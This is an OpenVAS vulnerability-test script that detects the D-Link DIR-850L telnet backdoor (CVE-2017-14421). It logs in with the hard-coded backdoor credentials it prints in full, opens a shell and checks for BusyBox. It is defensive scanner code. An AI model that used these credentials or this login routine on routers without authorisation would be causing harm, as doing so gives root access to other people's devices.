###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_dir850l_revB_telnet_backdoor.nasl 9146 2018-03-20 09:29:25Z cfischer $
#
# D-Link DIR-850L Telnet Account Backdoor (LAN)
#
# Authors:
# Michael Martin <michael.martin@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107301");
  script_version("$Revision: 9146 $");
  script_cve_id("CVE-2017-14421");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-03-20 10:29:25 +0100 (Tue, 20 Mar 2018) $");
  script_tag(name:"creation_date", value:"2018-03-19 13:22:17 +0100 (Mon, 19 Mar 2018)");
  script_name("D-Link DIR-850L Telnet Account Backdoor (LAN)");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_dependencies("telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);

  script_xref(name:"URL", value:"https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html#backdoor");

  script_tag(name:"summary", value:"The D-Link DIR-850L router has a backdoor account with hard-coded credentials.");
  script_tag(name:"impact", value:"This issue may only be exploited by a attacker on the LAN to get a root
  shell on the device.");
  script_tag(name:"vuldetect", value:"Connect to the telnet service and try to login with default credentials.");
  script_tag(name:"insight", value:"It was possible to login with the telnet credentials 'Alphanetworks:wrgac25_dlink.2013gui_dir850l'.");
  script_tag(name:"solution", value:"It is recommended to disable the telnet access.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("telnet_func.inc");

port = get_telnet_port( default:23 );

login = "Alphanetworks";
pass = "wrgac25_dlink.2013gui_dir850l";

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

recv = telnet_negotiate( socket:soc );

if( "Login:" >< recv ) {

  send( socket:soc, data:login + '\r\n' );
  recv = recv( socket:soc, length:128 );

  if( "Password:" >< recv ) {

    send( socket:soc, data:pass + '\r\n\r\n' );
    recv = recv( socket:soc, length:1024 );

    send( socket:soc, data:'sh\r\n');
    recv = recv( socket:soc, length:1024 );

    if( "BusyBox" >< recv && "built-in shell" >< recv ) {
      VULN = TRUE;
      report = 'It was possible to login via telnet using the following credentials:\n\n';
      report += 'Login: ' + login + ', Password: ' + pass;
    }
  }
}

close( soc );

if( VULN ) {
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
